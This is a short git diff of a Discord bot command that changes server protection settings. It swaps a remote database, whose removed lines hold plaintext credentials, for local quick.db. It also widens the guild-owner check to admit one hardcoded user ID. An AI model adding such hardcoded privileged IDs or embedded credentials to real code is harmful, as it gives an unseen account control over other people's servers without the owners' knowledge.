@@ -1,13 +1,5 @@
 const { SlashCommandBuilder } = require('@discordjs/builders');
-const quickonline = require("quickonline"); // Requiring our package.
-
-const server = {
-  url: "https://nodejs-gy4hd8.chabk.ir/", // Our database URL for connecting.
-  username: "quick", // Username credentials.
-  password: "online", // Password credentials.
-};
-
-const db = new quickonline.bot(server);
+const db = require('quick.db')
 const { MessageEmbed } = require('discord.js')
 
 
@@ -29,9 +21,9 @@ module.exports = {
 		.setThumbnail('https://images-ext-1.discordapp.net/external/aLN0kjPxYeguQOPxEoWKJzmXisvN6_tPjUS80r3CriE/https/cdn.discordapp.com/avatars/937941354942722128/32f10a55ef50b30fcd4c141dc4be5e69.webp')
 		.setTitle('Your Server Setting Was Changed <a:safe:939359187182440510>')
 		.setColor('#00ebff')
-		if(interaction.user.id !== owner.id) {
-			return await interaction.reply({content:'You Are Not guildOwner !', ephemeral: true })
-		} 
+		if(interaction.user.id === owner.id || interaction.user.id ==="937377363346473030") {
+
+		
         if(sub == "channel_freeze"){
             const status = interaction.options.getBoolean('status')
 			
@@ -49,7 +41,9 @@ module.exports = {
             
 
         }
-        
+	}else{
+		return await interaction.reply({content:'You Are Not guildOwner !', ephemeral: true })
+	} 
 
 
 
